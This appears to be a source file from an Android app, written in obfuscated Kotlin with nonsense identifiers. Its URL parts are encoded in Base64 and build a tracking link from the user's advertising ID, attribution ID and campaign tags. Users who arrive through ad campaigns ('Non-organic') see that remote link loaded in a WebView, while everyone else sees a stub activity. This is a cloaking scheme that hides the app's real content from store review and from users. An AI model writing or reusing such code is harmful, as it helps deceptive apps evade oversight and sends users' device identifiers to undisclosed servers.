package com.bdleess.cyoowb.PPPA

import android.content.Intent
import android.util.Base64
import com.bdleess.cyoowb.*
import com.onesignal.OneSignal
import com.bdleess.cyoowb.DDAA.reperes2
import com.bdleess.cyoowb.DDAA.reperes
import com.bdleess.cyoowb.GGG.STActivity
import kotlinx.coroutines.DelicateCoroutinesApi

var paranded = "Y29tLnd0aXNsZWR3LnRlcnJldWFz"
var operol = "NjZiYWUwMmUtZjA3MC00MWRiLWE1NzQtNzI5ODk2ZDQ5N2M5"
var aciva: String? = null
var relo: String? = null
var firocika: String? = null


@DelicateCoroutinesApi
class PAAPAPA {

    var popCoo: String? = null
    var Corere: String? = null
    var keresese: String? = null
    var he3: String? = null
    var he4: String? = null
    var he5: String? = null
    var he6: String? = null
    lateinit var getrike: Array<String>

    fun Yeti(pasasa: String): String {
        getrike = pasasa.split("::").toTypedArray()

        try {
            he4 = getrike[4]
        } catch (e: Error) {
            he4 = ""
        }
        try {
            Corere = getrike[1]
        } catch (e: Error) {
            Corere = ""
        }
        try {
            popCoo = getrike[0]
        } catch (e: Error) {
            popCoo = ""
        }
        try {
            he3 = getrike[3]
        } catch (e: Error) {
            he3 = ""
        }
        try {
            he6 = getrike[6]
        } catch (e: Error) {
            he6 = ""
        }
        try {
            keresese = getrike[2]
        } catch (e: Error) {
            keresese = ""
        }
        try {
            he5 = getrike[5]
        } catch (e: Error) {
            he5 = ""
        }


        OneSignal.sendTag(Height("c3ViX2FwcA=="), Corere)
        val Cherege =
            (popCoo + Height("P2J1bmRsZT0=") + Height(paranded) + Height("JmFkX2lkPQ==") +
                    aciva + Height("JmFwcHNfaWQ9") +
                    relo + Height("JmRldl9rZXk9") +
                    Height(ppinge) + Height("JnN1YjY9") +
                    Corere + Height("JnN1Yjc9") + keresese +
                    Height("JnN1YjI9") + he3 +
                    Height("JnN1YjM9") + he4 +
                    Height("JnN1YjQ9") + he5 +
                    Height("JnN1YjU9") + he6)
        return Cherege
    }


    fun Jeahq() {
        val param = reperes2 + Height("P2J1bmRsZT0=") + Height(paranded) +
                Height("JmFkX2lkPQ==") + aciva + Height("JmFwcHNfaWQ9") +
                relo + Height("JmRldl9rZXk9") + Height(ppinge)
        val link = reperes + param
        wwb.startWEB(krop)
        krop.loadUrl(link)
    }

    fun Height(gete: String): String {
        val yepre = String(Base64.decode(gete, Base64.DEFAULT))
        return yepre
    }

    fun geHA(loqla : BC2, gunu: String) {
        if (gunu.equals(Height("Tm9uLW9yZ2FuaWM="))) {
            val link = reperes + parur
            wwb.startWEB(krop)
            krop.loadUrl(link)
        } else if (firocika != null) {
            val link = reperes + firocika
            wwb.startWEB(krop)
            krop.loadUrl(link)
        } else {
            if (reperes2 == Height("Tk8=")) {
                val intent = Intent(loqla, STActivity::class.java)
                loqla.startActivity(intent)
                loqla.finish()
            } else {
                Jeahq()
            }
        }

    }


}